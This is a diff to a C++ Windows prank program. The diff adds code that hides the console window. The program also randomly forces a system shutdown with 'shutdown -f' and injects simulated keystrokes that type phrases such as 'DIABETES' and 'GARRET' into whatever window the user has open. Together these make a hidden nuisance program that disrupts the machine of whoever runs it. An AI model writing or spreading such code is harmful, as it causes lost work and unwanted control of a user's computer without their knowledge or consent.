@@ -1,6 +1,7 @@
 #include<cstdlib>
 #include<iostream>
 #include<ctime>
+#define WINVER 0x0501
 #include <windows.h>
 #include <mmsystem.h>
 #include <shellapi.h>
@@ -13,10 +14,13 @@ void sleep(unsigned milliseconds) {
         Sleep(milliseconds * 1000);
 }
 
-void changePhrase(char[]);
+string changePhrase();
 
 int main() {
-
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	
+	srand(time(0));
+	
 	char chaPhrase[ARR_LENGTH];
 	
 	//Allows reading keyboard
@@ -59,7 +63,7 @@ int main() {
 			system("shutdown -f");
 		}
 		else if (rand() % 5 == 0) {
-			changePhrase(chaPhrase);
+			strcpy(chaPhrase, changePhrase().c_str());
 			//Types out chaPhrase array
 			for (int i = 0; i < ARR_LENGTH; i++) {
 				keyInput.ki.wVk = chaPhrase[i];
@@ -75,17 +79,20 @@ int main() {
 	return 0;
 } // End Main
 
-void changePhrase(char chaPhrase[]) {
+string changePhrase() {
+	string strPhrase;
 	int i = rand() % 3;
 	switch (i) {
 		case 0:
-			strcpy(chaPhrase, "DIABETES");
+			strPhrase = "DIABETES";
 			break;
 		case 1:
-			strcpy(chaPhrase, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+			strPhrase = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 			break;
 		case 2:
-			strcpy(chaPhrase, "Garret");
+			strPhrase = "GARRET";
 			break;
 	}
+	
+	return strPhrase;
 }
